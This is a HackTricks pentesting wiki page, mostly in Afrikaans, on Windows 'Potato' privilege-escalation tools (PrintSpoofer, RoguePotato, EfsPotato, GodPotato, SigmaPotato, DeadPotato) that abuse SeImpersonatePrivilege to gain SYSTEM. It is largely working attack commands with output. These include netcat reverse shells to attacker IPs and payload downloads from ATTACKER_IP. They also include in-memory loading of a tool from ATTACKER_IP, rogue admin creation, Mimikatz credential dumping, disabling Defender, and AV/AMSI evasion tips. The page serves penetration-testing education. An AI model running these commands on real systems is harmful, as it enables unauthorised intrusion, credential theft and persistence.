# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 build 1809 en later nie. Daarenteen kan [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** gebruik word om dieselfde voorregte te benut en `NT AUTHORITY\SYSTEM` vlak toegang te verkry. Hierdie [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) gaan in diepte oor die `PrintSpoofer` tool, wat gebruik kan word om impersonation privileges op Windows 10 en Server 2019 gasheerrekenaars mis tebruik waar JuicyPotato nie meer werk nie.

> [!TIP]
> 'n Moderne alternatief wat gereeld in 2024–2025 onderhou is, is SigmaPotato (’n fork van GodPotato) wat in-memory/.NET reflection-gebruik en uitgebreide OS-ondersteuning byvoeg. Sien vinnige gebruiksvoorbeeld hieronder en die repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene valkuils

Al die volgende tegnieke berus op die misbruik van 'n impersonation-capable privileged service vanaf 'n konteks wat een van hierdie voorregte het:

- SeImpersonatePrivilege (mees algemeen) of SeAssignPrimaryTokenPrivilege
- Hoë integriteit is nie nodig nie as die token reeds SeImpersonatePrivilege het (tipies vir baie service accounts soos IIS AppPool, MSSQL, ens.)

Kontroleer voorregte vinnig:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- As jou shell onder 'n beperkte token hardloop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sommige kontekste), herstel die rekening se standaardvoorregte met FullPowers, en voer dan 'n Potato uit. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benodig die Print Spooler service om te loop en bereikbaar te wees oor die plaaslike RPC-endpunt (spoolss). In geharde omgewings waar Spooler na PrintNightmare gedeaktiveer is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato vereis 'n OXID resolver wat bereikbaar is op TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende/nie-ondersteunde RPC authentication service; probeer 'n ander pipe/transport of maak seker die teikendiens loop.
- 'Kitchen-sink' forks soos DeadPotato bundel ekstra payload modules (Mimikatz/SharpHound/Defender off) wat die skyf raak; verwag hoër EDR-detektering in vergelyking met die slanke oorspronklikes.

## Vinnige Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Aantekeninge:
- Jy kan -i gebruik om 'n interactive process in die huidige konsole te spawn, of -c om 'n one-liner uit te voer.
- Vereis Spooler service. As dit afgeskakel is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
As uitgaande 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato is 'n nuwer COM-misbruik-primitive wat laat in 2022 vrygestel is en die PrintNotify-diens teiken in plaas van die Spooler/BITS. Die binêre instansieer die PrintNotify COM-bediener, ruil 'n vals `IUnknown` in, en aktiveer dan 'n bevoorregte callback via `CreatePointerMoniker`. Wanneer die PrintNotify-diens (wat as **SYSTEM** loop) terugkoppel, dupliseer die proses die teruggestuurde token en spawn die verskafde payload met volle voorregte.

Belangrike operasionele notas:

* Werk op Windows 10/11 en Windows Server 2012–2022 solank die Print Workflow/PrintNotify service geïnstalleer is (dit is teenwoordig selfs wanneer die legacy Spooler na PrintNightmare gedeaktiveer is).
* Vereis dat die oproepende konteks **SeImpersonatePrivilege** besit (tipies vir IIS APPPOOL, MSSQL, en geskeduleerde-taak diensrekeninge).
* Aanvaar óf 'n direkte opdrag óf 'n interaktiewe modus sodat jy in die oorspronklike konsole kan bly. Voorbeeld:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Aangesien dit suiwer COM-gebaseerd is, is geen named-pipe listeners of external redirectors nodig nie, wat dit 'n drop-in replacement maak op gasheerrekenaars waar Defender RoguePotato’s RPC binding blokkeer.

Operateurs soos Ink Dragon vuur PrintNotifyPotato onmiddellik nadat hulle ViewState RCE op SharePoint verkry het om van die `w3wp.exe` worker na SYSTEM te pivot voordat hulle ShadowPad installeer.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Aantekeninge:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege teenwoordig is.
- Haal die binary wat by die geïnstalleerde runtime pas (bv., `GodPotato-NET4.exe` op moderne Server 2022).
- As jou aanvanklike execution primitive 'n webshell/UI met kort timeouts is, stage die payload as 'n script en vra GodPotato om dit te run in plaas van 'n lang inline command.

Vinnige staging-patroon vanaf 'n skryfbare IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat diens-DCOM-objekte teiken wat standaard op RPC_C_IMP_LEVEL_IMPERSONATE ingestel is. Bou of gebruik die verskafde binaries en voer jou command uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (opgedateerde GodPotato fork)

SigmaPotato voeg moderne geriewe by soos in-memory execution via .NET reflection en 'n PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Ingeboude reverse shell-flag `--revshell` en verwydering van die 1024-char PowerShell-grens sodat jy lang AMSI-bypassing payloads in een keer kan afvuur.
- Reflection-vriendelike sintaksis (`[SigmaPotato]::Main()`), en 'n rudimentêre AV-omseilingstruuk via `VirtualAllocExNuma()` om eenvoudige heuristieke te mislei.
- Afsonderlike `SigmaPotatoCore.exe` saamgestel teen .NET 2.0 vir PowerShell Core omgewings.

### DeadPotato (2024 GodPotato-herwerking met modules)

DeadPotato behou die GodPotato OXID/DCOM impersonation chain, maar voeg post-exploitation helpers in sodat operators onmiddellik SYSTEM kan neem en persistence/collection kan uitvoer sonder bykomende tooling.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — voer 'n arbitrêre opdrag uit as SYSTEM.
- `-rev <ip:port>` — vinnige reverse shell.
- `-newadmin user:pass` — skep 'n local admin vir persistence.
- `-mimi sam|lsa|all` — drop en voer Mimikatz uit om credentials te dump (skryf na skyf, baie lawaaierig).
- `-sharphound` — voer SharpHound collection uit as SYSTEM.
- `-defender off` — skakel Defender real-time protection af (baie lawaaierig).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Omdat dit ekstra binaries insluit, verwag hoër AV/EDR flags; gebruik die slanker GodPotato/SigmaPotato wanneer stealth saak maak.

## Verwysings

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
